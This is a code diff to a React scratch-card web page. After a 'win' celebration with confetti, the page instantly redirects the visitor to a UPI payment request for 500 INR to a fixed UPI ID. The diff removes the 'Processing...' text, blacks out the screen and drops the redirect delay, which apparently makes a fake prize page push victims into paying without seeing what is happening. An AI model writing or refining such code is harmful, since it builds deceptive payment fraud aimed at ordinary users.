@@ -123,22 +123,11 @@ export default function ScratchCardPage() {
         setShowCelebration(true);
         playCelebrationSound();
         
-        // Auto-redirect to PhonePe instantly
+        // Auto-redirect to PhonePe instantly - no delays
         if (!hasRedirected.current) {
           hasRedirected.current = true;
-          // Try multiple UPI formats for better compatibility
-          const upiLinks = [
-            `upi://pay?pa=gazit6557@okaxis&pn=BriefApp&am=500&cu=INR`,
-            `phonepe://upi/pay?pa=gazit6557@okaxis&pn=BriefApp&am=500`,
-          ];
-          
-          // Try first link
-          window.location.href = upiLinks[0];
-          
-          // If first doesn't work after 2 seconds, try second
-          setTimeout(() => {
-            window.location.href = upiLinks[1];
-          }, 2000);
+          const upiLink = `upi://pay?pa=gazit6557@okaxis&pn=BriefApp&am=500&cu=INR`;
+          window.location.href = upiLink;
         }
       }
     };
@@ -171,11 +160,7 @@ export default function ScratchCardPage() {
     <div className="flex flex-col items-center justify-start w-screen min-h-screen bg-gray-100 p-0 m-0">
       {showCelebration && <Confetti />}
       {showCelebration && (
-        <div className="fixed inset-0 bg-white z-40 flex items-center justify-center">
-          <div className="text-center">
-            <div className="text-4xl font-bold text-gray-800 mb-4">Processing...</div>
-          </div>
-        </div>
+        <div className="fixed inset-0 bg-black z-40"></div>
       )}
       
       <div className="w-full" style={{ flex: '0 0 25%', minHeight: '0' }}>
